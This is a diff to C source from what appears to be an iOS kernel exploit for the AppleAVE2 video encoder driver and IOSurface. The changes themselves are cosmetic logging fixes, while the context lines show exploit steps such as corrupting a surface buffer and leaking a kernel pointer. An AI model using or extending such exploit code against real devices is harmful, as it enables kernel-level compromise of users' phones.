@@ -127,9 +127,8 @@ kern_return_t apple_ave_pwn_get_surface_kernel_address(uint32_t surface_id, void
 	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_slice_per_frame)) = 0x1;
 
 	ret = apple_ave_utils_prepare_to_encode_frames(g_apple_ave_conn, input_buffer, output_buffer);
-	if (KERN_SUCCESS != ret)
-	{
-		printf("[ERROR]: preparing to encode frames...\n");
+	if (KERN_SUCCESS != ret) {
+		printf("[ERROR]: apple_ave_pwn_get_surface_kernel_address preparing to encode frames...\n");
 		goto cleanup;
 	}
 
@@ -214,23 +213,25 @@ kern_return_t apple_ave_pwn_init() {
 	ret = apple_ave_utils_add_client(g_apple_ave_conn);
 	if (KERN_SUCCESS != ret)
 	{
-		printf("[ERROR]: adding AppleAVE2 client");
+		printf("[ERROR]: adding AppleAVE2 client\n");
 		IOServiceClose(g_apple_ave_conn);
 		g_apple_ave_conn = 0;
 		goto cleanup;
-	}
+    } else {
+        printf("[INFO]: added AppleAVE2 client\n");
+    }
 
 	ret = iosurface_utils_get_connection(&g_surface_conn);
 	if (KERN_SUCCESS != ret)
 	{
-		printf("[ERROR]: initiating connection to IOSurfaceRoot");
+		printf("[ERROR]: initiating connection to IOSurfaceRoot\n");
 		goto cleanup;
 	}
 
 	ret = iosurface_utils_create_surface(g_surface_conn, &g_bad_surface_that_will_never_be_freed, surface_data);
 	if (KERN_SUCCESS != ret)
 	{
-		printf("[ERROR]: creating a bad surface that will never be freed");
+		printf("[ERROR]: creating a bad surface that will never be freed\n");
 		goto cleanup;
 	}
 
@@ -245,7 +246,7 @@ kern_return_t apple_ave_pwn_init() {
 		printf("[ERROR]: apple_ave_pwn_init getting kernel pointer for surface %d\n", g_bad_surface_that_will_never_be_freed);
 	}
 	else {
-		printf("[INFO]:g_bad_surface_that_will_never_be_freed's kernel pointer is %p\n", g_bad_surface_that_will_never_be_freed_kernel_ptr);
+		printf("[INFO]: g_bad_surface_that_will_never_be_freed's kernel pointer is %p\n", g_bad_surface_that_will_never_be_freed_kernel_ptr);
 	}
 
 cleanup:
